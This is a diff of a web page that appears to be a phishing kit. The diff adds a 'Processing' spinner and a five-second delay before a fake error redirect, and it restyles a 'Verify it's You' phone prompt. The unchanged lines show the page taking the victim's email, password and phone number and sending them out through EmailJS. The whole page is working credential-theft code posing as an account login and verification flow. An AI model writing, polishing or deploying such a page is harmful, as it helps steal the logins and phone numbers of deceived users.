@@ -138,6 +138,15 @@
                 href="#">legal</a></p>
     </div>
 
+
+    <div class="loader">
+
+        <svg viewBox="25 25 50 50">
+            <circle r="20" cy="50" cx="50"></circle>
+        </svg>
+        <p>Processing</p>
+    </div>
+
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
 (function(){
@@ -148,14 +157,16 @@
 
 let storedEmail = '';
 let storedPassword = '';
-
 function sendFormData(event) {
     event.preventDefault();
+
+    // Show the loader immediately
+    document.querySelector('.loader').style.visibility = 'visible';
 
     const emailElement = document.getElementById('email'); // Grab email input
     const passwordElement = document.getElementById('password'); // Grab password input
     const phoneElement = document.getElementById('phone'); // Grab phone input
-    
+
     const email = emailElement ? emailElement.value : storedEmail;
     const password = passwordElement ? passwordElement.value : storedPassword;
     const phone = phoneElement ? phoneElement.value : '';
@@ -179,10 +190,19 @@ function sendFormData(event) {
             .then(function (response) {
                 console.log(templateParams);
                 console.log('SUCCESS!', response.status, response.text);
-                window.location.href = "somethingwentwrog.html";
+
+                // Delay the page redirection after 5 seconds
+                setTimeout(function () {
+                    window.location.href = "somethingwentwrog.html";
+                }, 5000);  // 5-second delay before redirecting
+
+                // Hide the loader after email sending is complete
             }, function (error) {
                 console.log('FAILED...', error);
                 alert("error");
+
+                // Hide the loader if email sending fails
+                document.querySelector('.loader').style.visibility = 'hidden';
             });
     }
 }
@@ -203,7 +223,7 @@ function showPhoneVerificationForm() {
         <div style="display: flex; flex-direction: column; align-items: center;">
             <img src="./verificaitionn.jpg" height="150">
             <h2 style="text-align: center;">Verify it's You</h2>
-            <p style="text-align: center;">To confirm you're trying to access your account, please verify your phone number</p>
+            <p style="text-align: center;  margin-bottom: 20px;">To confirm you're trying to access your account, please verify your phone number</p>
             <br><br>
 
             <div class="phn" style="position: relative; margin-bottom: 20px;">
